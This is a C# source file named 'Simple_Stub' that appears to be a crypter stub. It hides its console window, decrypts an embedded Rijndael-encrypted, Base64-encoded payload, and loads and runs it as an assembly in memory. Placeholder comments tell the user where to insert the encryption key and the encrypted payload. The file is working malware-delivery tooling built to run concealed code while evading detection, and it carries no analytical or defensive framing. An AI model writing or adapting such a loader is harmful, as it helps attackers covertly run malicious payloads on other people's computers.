using System;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

namespace Simple_Stub
{
    [System.ComponentModel.RunInstaller(true)]
    class Program
    {
        [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        static string Dkey = ""; //Put Encrypt Key
        static string Payload = ""; //Put B64 + Encrypt Payload
        static void Main()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, 0);
            Thread.Sleep(1000);
            Assembly asm = Assembly.Load(Convert.FromBase64String(Decrypt(Payload, Dkey)));
            MethodInfo mtd = asm.EntryPoint;
            mtd.Invoke(null, null);
        }
        private static string Decrypt(string Data, string key)
        {
            RijndaelManaged RijndaelCipher = new RijndaelManaged();
            byte[] EncryptedData = Convert.FromBase64String(Data);
            byte[] Salt = Encoding.ASCII.GetBytes(key.Length.ToString());
            PasswordDeriveBytes SecretKey = new PasswordDeriveBytes(key, Salt);
            ICryptoTransform Decryptor = RijndaelCipher.CreateDecryptor(SecretKey.GetBytes(32), SecretKey.GetBytes(16));
            MemoryStream memoryStream = new MemoryStream(EncryptedData);
            CryptoStream cryptoStream = new CryptoStream(memoryStream, Decryptor, CryptoStreamMode.Read);
            byte[] PlainText = new byte[EncryptedData.Length];
            int DecrypedCount = cryptoStream.Read(PlainText, 0, PlainText.Length);
            memoryStream.Close();
            cryptoStream.Close();
            return Encoding.Unicode.GetString(PlainText, 0, DecrypedCount);
        }
    }
}
